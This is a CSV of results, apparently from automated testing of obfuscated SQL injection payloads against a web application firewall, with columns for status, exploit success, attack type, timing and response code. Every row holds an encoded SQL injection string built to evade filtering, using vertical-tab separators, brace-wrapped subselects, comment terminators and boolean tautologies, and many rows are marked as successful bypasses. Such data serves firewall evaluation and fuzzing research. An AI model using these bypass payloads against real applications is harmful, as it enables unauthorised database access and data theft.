Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code
0%27<@!=1+or+!+{x+(select%0b1)}=1=+(false)%0b||',Blocked,No,None,booleanAtk,0.0181,70.88,No,403
0%27<@=.1+||%0bnot%0b{a+1}=1=+(!+{x%0b(select%0b1)}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0149,70.88,No,200
0%27<@!=.1%0bor%0bfalse=%0b(!+{x+(select+1)}=1)+or%27,Bypassed,Yes,unionAtk,booleanAtk,0.0163,70.88,No,200
0'<@!=1+or%0bfalse=%0b(!+{a%0b1}=1)+or%27,Bypassed,No,None,booleanAtk,0.012,70.88,No,500
0%27<@=.1%0b||+not+{`if`%0b1}=1=%0b(not%0b{x+(select+1)}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0116,70.88,No,200
0%27<@!=.1+or+not+{a%0b1}=1=%0b(not+{x+(select+1)}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0139,70.88,No,200
0%27<@!=1.%0b||+!+{x+(select+1)}=1=%0b(not%0b{x+(select+1)}=1,Bypassed,Yes,unionAtk,Unknown,0.0098,70.88,No,200
0%27<@=1.+or%0b!%0b{x%0b(select+1)}=1=%0b(false)%0bor%27,Bypassed,Yes,unionAtk,booleanAtk,0.0113,70.88,No,200
0%27<@!=1.%0bor%0b!%0b{a+1}=1=%0b(0)+or',Bypassed,No,None,Unknown,0.0171,70.88,No,500
0'<@=1.+or%0b0=+(!%0b{`if`+1}=1)%0b||',Bypassed,No,None,Unknown,0.0138,71.08,No,500
0%27<@=1+||+!+true=%0b(!+{x+(select+1)}=1)%0bor%27,Bypassed,Yes,unionAtk,booleanAtk,0.017,71.28,No,200
0%27or+@<@.+or%0b{x+(select+1)}=1%0blike%0b{`if`+1}=1%0bor',Blocked,No,None,Unknown,0.0097,69.77,No,403
0'<@=.1+||+!%7efalse=+(!+{a+1}=1)+||%27,Bypassed,No,None,Unknown,0.0102,70.38,No,500
0%27<@!=1%0b||%0bnot+{x+(select%0b1)}=1=+(!%0b{x+(select+1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0087,70.38,No,200
0'<@!=.1+||%0b!%0b{x+(select%0b1)}=1=+(!~false)+or%27,Blocked,No,None,booleanAtk,0.0094,70.38,No,403
0%27<@!=.1%0b||%0bnot%7efalse=%0b(!%0b{a+1}=1)+||',Bypassed,No,None,Unknown,0.0148,70.38,No,500
0'<@!=.1%0b||%0b!%7efalse=+(!%0b{a+1}=1)+or',Bypassed,No,None,booleanAtk,0.0187,70.44,No,500
0'||%0b@<@.+||%0b!%0b{`if`+1}=1=%0b(!+{`if`%0b1}=1)%0b,Bypassed,No,None,Unknown,0.0207,70.56,No,500
0'<@!=1.+or%0b!%0b{x+(select+1)}=1=+(!+{x%0b(select+1)}=1),Blocked,No,None,Unknown,0.0048,70.63,No,403
0'<@=1+||%0b!%0b{x+(select+1)}=1=+(not+{x%0b(select+1)}=1),Blocked,No,None,Unknown,0.0158,70.75,No,403
0%27<@=1.%0bor+not%0b{x+(select+1)}=1=+(not+{`if`+1}=1)+,Bypassed,Yes,unionAtk,Unknown,0.014,70.88,No,200
0%27||+!@<@.+||%0bnot%0b{a+1}=1=%0b(not+{`if`%0b1}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0217,70.88,No,200
0%27<@!=.1%0bor%0bnot~false=%0b(not+{x%0b(select+1)}=1)+||%27,Bypassed,Yes,unionAtk,booleanAtk,0.0141,70.88,No,200
0%27||%0b@<@.+||+!%0b{x%0b(select+1)}=1=+(!%0b{a+1}=1,Bypassed,Yes,unionAtk,Unknown,0.0103,70.88,No,200
0%27<@=1+or%0bnot+{x%0b(select%0b1)}=1=%0b(not+{x+(select%0b1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0115,70.88,No,200
0%27<@=.1%0b||%0bnot+{x+(select%0b1)}=1=+(false)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0117,70.88,No,200
0'<@=1.+or%0bnot+{`if`%0b1}=1=+(not%0b{x%0b(select%0b1)}=1)+,Bypassed,No,None,Unknown,0.0199,70.88,No,500
0%27<@=.1%0b||%0b!+{x+(select+1)}=1=%0b(not+{`if`%0b1}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0158,70.88,No,200
0'<@!=1.+||+not%7efalse=%0b(!~false)+or',Bypassed,No,None,booleanAtk,0.0136,70.88,No,500
0'<@!=.1+||+false=+(!~false)--%0b,Blocked,No,None,piggyAtk,0.0034,70.88,No,403
0%27<@!=1.%0b||%0bnot%7e0=%0b(not+true)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0199,70.88,No,200
0%27<@!=.1%0b||%0bnot%0b{x%0b(select+1)}=1=+(not+{x+(select%0b1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0098,70.88,No,200
0'<@=1.%0b||%0bnot%0b{x%0b(select+1)}=1=+(not%0b{x%0b(select+1)}=1),Bypassed,No,None,Unknown,0.0083,70.88,No,500
0%27<@=.1%0bor%0b!%0b{x+(select%0b1)}=1=+(not%0b{x+(select+1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0131,70.88,No,200
0%27or+@<@.%0bor+!+{`if`%0b1}=1=%0b(not%0b{x+(select%0b1)}=1,Bypassed,Yes,unionAtk,Unknown,0.0077,70.88,No,200
0'<@!=1+or%0bnot+{a+1}=1=+(not%0b{x%0b(select+1)}=1)+,Bypassed,No,None,Unknown,0.0218,70.88,No,500
0'<@=.1+or+not+{x+(select+1)}=1=+(!%0b{x%0b(select+1)}=1),Blocked,No,None,Unknown,0.0088,70.88,No,403
0'<@=1.+or+not+{x%0b(select+1)}=1=%0b(!%0b{x+(select+1)}=1),Bypassed,No,None,Unknown,0.0214,70.88,No,500
0'<@!=1.+or%0bnot+1=+(not%0b{`if`+1}=1)+or',Bypassed,No,None,Unknown,0.0149,70.88,No,500
0%27<@=.1%0b||%0b!+{x%0b(select%0b1)}=1=%0b(not%0b{`if`+1}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0171,70.88,No,200
0%27<@=1.%0bor%0b!+1=+(not+{`if`%0b1}=1)%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.0178,70.88,No,200
0%27<@!=.1+||%0b!%7efalse=+(not%0b{a+1}=1)--%0b,Bypassed,Yes,unionAtk,piggyAtk,0.0111,70.88,No,200
0%27<@=.1+||+not%7efalse=%0b(not%0b{x%0b(select+1)}=1)--+,Bypassed,Yes,unionAtk,piggyAtk,0.0174,70.88,No,200
0'<@=.1+or+not%7efalse=+(!+{x+(select%0b1)}=1)%0b||%27,Bypassed,No,None,booleanAtk,0.0133,70.88,No,500
0%27<@!=1%0bor+!+{a+1}=1=%0b(!%7efalse)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0124,70.88,No,200
0'<@!=1%0b||+!%0b{x%0b(select%0b1)}=1=+(not+{a%0b1}=1)--,Bypassed,No,None,piggyAtk,0.0173,70.88,No,500
0'<@!=1+||+not%7efalse=%0b(!~0)+||',Bypassed,No,None,Unknown,0.0189,70.88,No,500
0%27<@!=.1+or+not+{x+(select+1)}=1=+(!%0b{a+1}=1)+,Blocked,No,None,Unknown,0.0099,70.88,No,403
0%27<@=1+or+{x+(select+1)}=1+like%0b{x+(select%0b1)}=1+or%27,Blocked,No,None,Unknown,0.0065,70.88,No,403
0%27<@=1.+||+!+{`if`%0b1}=1=%0b(!+{x%0b(select+1)}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0112,70.88,No,200
0%27<@!=.1+or%0bnot+{`if`+1}=1=+(!%0b{a+1}=1)+or',Bypassed,No,None,Unknown,0.0126,70.88,No,500
0'<@=1.%0b||%0b0=%0b(0)%23,Bypassed,No,None,piggyAtk,0.0206,70.88,No,500
0%27<@=1+or+!%0b{`if`+1}=1=%0b(0)+or',Bypassed,No,None,Unknown,0.0132,70.88,No,500
0%27<@=.1+||+not%0b{`if`%0b1}=1=+(not+{x+(select+1)}=1)%0b,Bypassed,Yes,unionAtk,Unknown,0.0109,70.88,No,200
0'<@=.1+or%0b!~0=%0b(not%0b{x%0b(select%0b1)}=1)%0b||%27,Bypassed,No,None,Unknown,0.0133,70.88,No,500
0%27<@!=.1+or+not%0b{x+(select+1)}=1=+(not+1)--+,Bypassed,Yes,unionAtk,piggyAtk,0.0178,70.88,No,200
0'<@!=1+||%0b!+{`if`+1}=1=%0b(not%0b{x%0b(select+1)}=1)%0b,Bypassed,No,None,Unknown,0.0189,70.88,No,500
0'<@!=1.+or+!%0b1=%0b(!+{x+(select+1)}=1)+||%27,Blocked,No,None,Unknown,0.0081,70.88,No,403
0%27<@!=1+or%0bnot%0btrue=+(not+{x+(select%0b1)}=1)+||',Bypassed,No,None,booleanAtk,0.0133,71.16,No,500
0'<@!=.1+or%0b{x+(select+1)}=1+like%0b{x%0b(select%0b1)}=1--+,Bypassed,No,None,piggyAtk,0.0247,71.28,No,500
0'<@=1%0bor%0b!+{`if`%0b1}=1=%0b(!%0b{a%0b1}=1)+or%27,Bypassed,No,None,Unknown,0.0171,71.28,No,500
0'<@=1.+||%0bnot+{x%0b(select+1)}=1=+(!%0b{x+(select+1)}=1),Bypassed,No,None,Unknown,0.0176,69.78,No,500
0'<@!=.1+||%0bnot+{x+(select+1)}=1=+(!+{x+(select%0b1)}=1),Blocked,No,None,Unknown,0.0106,70.38,No,403
0%27<@!=1+or+!+{x+(select+1)}=1=+(!%0b{a+1}=1)--,Blocked,No,None,piggyAtk,0.0069,70.38,No,403
0%27<@=.1%0b||%0bnot+{`if`+1}=1=%0b(!%0b{x+(select+1)}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0204,70.38,No,200
0%27<@=1.+or+!%0b{x+(select%0b1)}=1=+(not+{`if`+1}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0132,70.38,No,200
0%27<@!=.1+or%0b!+{x+(select+1)}=1=+(!+{a+1}=1)+,Blocked,No,None,Unknown,0.0138,70.44,No,403
0%27<@!=1+or%0bnot%7efalse=%0b(!+{`if`+1}=1)+or%27,Bypassed,Yes,unionAtk,booleanAtk,0.0164,70.5,No,200
0%27<@!=1%0bor%0b{x+(select+1)}=1+like+{x+(select%0b1)}=1+||',Bypassed,No,None,Unknown,0.0182,70.56,No,500
0'<@!=.1+or%0b!%0b{x%0b(select%0b1)}=1=+(not+{a%0b1}=1)%23,Blocked,No,None,piggyAtk,0.0055,70.63,No,403
0%27<@=1.%0b||+!%0b{x+(select+1)}=1=+(!%0b{x+(select%0b1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0167,70.75,No,200
0'<@!=.1+||%0bfalse=+(!%0b{a%0b1}=1)+or',Bypassed,No,None,booleanAtk,0.0184,70.88,No,500
0%27<@!=1%0b||%0bnot+{x+(select%0b1)}=1=+(not%0b{x+(select%0b1)}=1,Bypassed,Yes,unionAtk,Unknown,0.0218,70.88,No,200
0'<@=.1%0bor+!+true=%0b(not%0b{x+(select+1)}=1)+or',Bypassed,No,None,booleanAtk,0.0092,70.88,No,500
0%27<@=1.+||+not%0b{x+(select+1)}=1=+(not+{x%0b(select%0b1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0176,70.88,No,200
0%27<@=.1%0bor%0b!%0btrue=+(not+{x%0b(select%0b1)}=1)%0b||%27,Bypassed,Yes,unionAtk,booleanAtk,0.0126,70.88,No,200
0%27<@!=1.%0bor%0bnot~false=+(not+{x%0b(select+1)}=1)+or',Bypassed,No,None,booleanAtk,0.022,70.88,No,500
0%27<@!=.1%0b||+!+{a+1}=1=+(!+true)%0b||%27,Bypassed,Yes,unionAtk,Unknown,0.0076,70.88,No,200
0%27<@!=1.%0b||%0b!%0b{x%0b(select+1)}=1=%0b(!~0)+||',Bypassed,No,None,Unknown,0.0244,70.88,No,500
0%27<@=1.%0bor+not+{x%0b(select+1)}=1=+(not%0b{a+1}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0125,70.88,No,200
0%27<@!=.1+||+not+{x+(select%0b1)}=1=%0b(not+1)+or%27,Blocked,No,None,Unknown,0.0102,70.88,No,403
0'<@!=1+or%0b!%0b{`if`%0b1}=1=%0b(!%7efalse)%0b||',Bypassed,No,None,booleanAtk,0.0141,70.88,No,500
0%27<@=1.+or+not+{a%0b1}=1=+(not%7efalse)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0083,70.88,No,200
0'<@!=1.%0bor%0bnot+{x+(select+1)}=1=%0b(!+{a+1}=1)+,Bypassed,No,None,Unknown,0.0143,70.88,No,500
0%27<@!=1.%0b||%0b!~false+is%0bfalse--%0b,Bypassed,Yes,unionAtk,piggyAtk,0.0157,70.88,No,200
0%27<@=.1+or+not~0=%0b(!+{`if`+1}=1)+or',Bypassed,No,None,Unknown,0.0083,70.88,No,500
0%27<@!=1%0b||+not%0b{x+(select+1)}=1=%0b(!%0b{x+(select%0b1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0152,70.88,No,200
0'<@!=.1+or%0b!%0b{`if`%0b1}=1=+(!+{a+1}=1)+||%27,Bypassed,No,None,Unknown,0.0172,70.88,No,500
0'or%0b!@<@+||+true+like+{`if`%0b1}=1%0bor%27,Bypassed,No,None,booleanAtk,0.0232,70.88,No,500
0'<@!=.1+or+not+{x+(select+1)}=1=+(!+{`if`+1}=1)%23,Blocked,No,None,piggyAtk,0.0143,70.88,No,403
0%27<@!=.1+or+not+true=%0b(!%7efalse)+or%27,Bypassed,Yes,unionAtk,booleanAtk,0.026,70.88,No,200
0'<@!=1+||%0bnot%0b{`if`+1}=1=+(not%0b{`if`%0b1}=1)+or%27,Bypassed,No,None,Unknown,0.0171,70.88,No,500
0%27<@!=1+||+!%0b{a+1}=1=%0b(0)+or%27,Bypassed,Yes,unionAtk,Unknown,0.0158,70.88,No,200
0'<@=.1+||%0bnot%7e0=+(!%7efalse)+||',Bypassed,No,None,Unknown,0.0164,70.88,No,500
0'<@!=1+||+{x%0b(select+1)}=1+like%0b{x+(select+1)}=1%23,Blocked,No,None,piggyAtk,0.0101,70.88,No,403
0%27<@!=.1+or%0b!+{x%0b(select+1)}=1=+(!+{x%0b(select%0b1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0139,70.88,No,200
0'<@!=1.+or+not%0btrue=%0b(not+{x+(select%0b1)}=1)+or',Bypassed,No,None,booleanAtk,0.0118,70.88,No,500
0%27<@!=1%0bor%0b!+{`if`+1}=1=+(not%7efalse)%0bor%27,Bypassed,Yes,unionAtk,booleanAtk,0.0115,70.88,No,200
0'<@=1.%0b||%0b!~false=+(!+{x+(select+1)}=1)+or',Bypassed,No,None,booleanAtk,0.0126,70.88,No,500
0'<@=1+||%0b!+{x%0b(select%0b1)}=1=%0b(!+{x+(select%0b1)}=1,Bypassed,No,None,Unknown,0.0095,70.88,No,500
0'<@!=.1%0b||%0bnot%7efalse=%0b(not+{x%0b(select%0b1)}=1)%23,Bypassed,No,None,piggyAtk,0.0213,70.88,No,500
0%27<@!=1.+||%0b!%0b{a+1}=1=+(not%0b{`if`%0b1}=1)%0b||%27,Bypassed,Yes,unionAtk,Unknown,0.0179,70.88,No,200
0'<@=1%0b||%0bnot+{x+(select+1)}=1=%0b(not~false)+||',Bypassed,No,None,Unknown,0.0091,70.88,No,500
0%27<@!=1%0bor+not+{`if`+1}=1=%0b(not%7efalse)%0bor',Bypassed,No,None,booleanAtk,0.0169,70.88,No,500
0%27<@!=1+or+not%0b{x+(select%0b1)}=1=%0b(not%0b{x+(select+1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0128,70.88,No,200
0%27or+@<@.+||%0bnot%0b{a%0b1}=1=%0b(not+{a%0b1}=1)%0b,Bypassed,Yes,unionAtk,Unknown,0.0203,70.88,No,200
0%27<@!=.1+||%0bnot%0b{`if`+1}=1=%0b(not+{a+1}=1)%0bor',Bypassed,No,None,Unknown,0.0162,70.88,No,500
0'<@!=1.%0b||+!%0b{a+1}=1=+(!%0b{a+1}=1)+||',Bypassed,No,None,Unknown,0.0084,70.88,No,500
0%27<@!=.1%0bor%0bnot~false=+(not%0b{`if`+1}=1)%0bor%27,Bypassed,Yes,unionAtk,booleanAtk,0.0131,70.88,No,200
0'<@=1.+||%0b!%0b{x%0b(select%0b1)}=1=%0b(!+{a%0b1}=1)%0b,Blocked,No,None,Unknown,0.0054,70.88,No,403
0'or+!@<@+||+not%0b1=%0b(not+{`if`%0b1}=1)%0b||',Blocked,No,None,Unknown,0.0085,70.88,No,403
0%27<@!=1%0bor%0bnot%0b{x+(select+1)}=1=+(!~false)%0b||',Bypassed,No,None,booleanAtk,0.0236,70.16,No,500
0'<@=.1%0bor+not%0b{x%0b(select%0b1)}=1=%0b(not+{a+1}=1)%0b,Bypassed,No,None,Unknown,0.0155,70.38,No,500
0%27<@=.1%0b||+{`if`+1}=1%0blike+{x+(select+1)}=1--+,Bypassed,Yes,unionAtk,piggyAtk,0.019,70.38,No,200
0'<@!=1.%0bor%0b!+{x%0b(select+1)}=1=%0b(!%0b{`if`+1}=1)+,Bypassed,No,None,Unknown,0.0108,70.38,No,500
0%27<@=1.%0bor+!+{`if`+1}=1=+(not%0b{x+(select%0b1)}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0113,70.44,No,200
0'<@=1+or+true%0blike%0b{x+(select%0b1)}=1--+,Blocked,No,None,piggyAtk,0.0111,70.5,No,403
0'<@=1.+or+not%0b{`if`%0b1}=1=+(!+{x+(select%0b1)}=1)%0b,Bypassed,No,None,Unknown,0.0086,70.56,No,500
0%27<@!=1.+or%0bnot+1=+(!+{x+(select%0b1)}=1)%23,Blocked,No,None,piggyAtk,0.0149,70.63,No,403
0'<@!=.1+or+!+1=+(!%0b{x+(select+1)}=1)+||%27,Bypassed,No,None,Unknown,0.0132,70.75,No,500
0'<@!=1.+or+!+{x%0b(select%0b1)}=1=+(not+{a+1}=1)--,Bypassed,No,None,piggyAtk,0.0186,70.88,No,500
0%27<@=1.+||+0=+(!+{a%0b1}=1)%0b||',Bypassed,No,None,Unknown,0.0115,70.88,No,500
0'<@=1.%0bor+!+{`if`+1}=1=+(!%0btrue)+||',Bypassed,No,None,booleanAtk,0.0224,70.88,No,500
0'<@=1%0bor+not+{x%0b(select%0b1)}=1=+(not%0b{x+(select+1)}=1),Bypassed,No,None,Unknown,0.0131,70.88,No,500
0%27<@=.1%0bor+!+{`if`+1}=1=+(!%0b{a+1}=1)+or',Bypassed,No,None,Unknown,0.0255,70.88,No,500
0'<@=1.%0b||+true+like+{x+(select%0b1)}=1--+,Bypassed,No,None,piggyAtk,0.0173,70.88,No,500
0%27||%0b@<@.+or%0bnot%0b{a+1}=1=%0b(!%0b{`if`+1}=1)%0b,Bypassed,Yes,unionAtk,Unknown,0.0179,70.88,No,200
0'<@=1+or+{x%0b(select+1)}=1%0blike%0btrue+or',Blocked,No,None,booleanAtk,0.0054,70.88,No,403
0%27<@=.1%0bor+!%0b{`if`%0b1}=1=+(not%0b{x%0b(select+1)}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0195,70.88,No,200
0%27<@!=1.%0bor+not+{`if`+1}=1=+(not+{x+(select+1)}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0187,70.88,No,200
0'<@!=.1+||%0bnot+{x+(select+1)}=1=+(not+{x+(select+1)}=1,Blocked,No,None,Unknown,0.0069,70.88,No,403
0'<@!=1%0bor%0bnot+{x+(select+1)}=1=+(!%0b{x+(select%0b1)}=1,Bypassed,No,None,Unknown,0.0174,70.88,No,500
0'<@!=1%0bor%0bnot+{a%0b1}=1=+(!+{a+1}=1)+||',Bypassed,No,None,Unknown,0.0153,70.88,No,500
0%27<@!=.1+or+{x+(select%0b1)}=1+like%0b{x%0b(select+1)}=1+or%27,Blocked,No,None,Unknown,0.0049,70.88,No,403
0'<@=.1+or%0b!%7efalse=%0b(not+{x+(select%0b1)}=1)%0b||',Blocked,No,None,booleanAtk,0.018,70.88,No,403
0%27<@=1.+or%0bnot%0b{x+(select%0b1)}=1=+(not%7efalse)%0bor',Blocked,No,None,booleanAtk,0.0058,70.88,No,403
0%27<@!=.1%0b||%0b{a%0b1}=1%0blike+{x%0b(select%0b1)}=1%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.0109,70.88,No,200
0'<@!=1+or+{`if`+1}=1%0blike+{a+1}=1%0bor%27,Bypassed,No,None,Unknown,0.0164,70.88,No,500
0'<@!=1+||%0b!%7efalse=%0b(not%0b{`if`%0b1}=1)%23,Blocked,No,None,piggyAtk,0.0112,70.88,No,403
0'<@!=1.+or+not~0=%0b(!+{a%0b1}=1)+||%27,Bypassed,No,None,Unknown,0.0089,70.88,No,500
0'<@!=1.+||%0bnot+{`if`+1}=1=%0b(!+{a+1}=1)%0b||%27,Bypassed,No,None,Unknown,0.0141,70.88,No,500
0'<@=1.%0b||%0bnot%7efalse=+(not+{a+1}=1)+or',Bypassed,No,None,booleanAtk,0.0212,70.88,No,500
0'<@=1.%0bor+!%0b{x%0b(select+1)}=1=+(!%0b{`if`%0b1}=1)+,Bypassed,No,None,Unknown,0.0091,70.88,No,500
0'<@!=1%0b||%0bnot%0b{x+(select+1)}=1=+(not~false)%23,Bypassed,No,None,piggyAtk,0.0138,70.88,No,500
0'||%0b!@<@.+or+not%0b{a%0b1}=1=+(0)%0bor%27,Bypassed,No,None,Unknown,0.0084,70.88,No,500
0%27<@!=.1%0b||+not+{x+(select+1)}=1=%0b(not+{`if`+1}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0191,70.88,No,200
0'<@!=1+||+1+like%0b{x+(select%0b1)}=1%23,Bypassed,No,None,piggyAtk,0.0122,70.88,No,500
0'<@=.1+or+0=%0b(not%0b1)+||',Bypassed,No,None,Unknown,0.0156,70.88,No,500
0%27<@=1.%0b||%0b!+{x%0b(select%0b1)}=1=+(not%7e0)--%0b,Bypassed,Yes,unionAtk,piggyAtk,0.0179,70.88,No,200
0%27<@=1+or+not+{a%0b1}=1=%0b(!%0btrue)+||',Bypassed,No,None,booleanAtk,0.0164,70.88,No,500
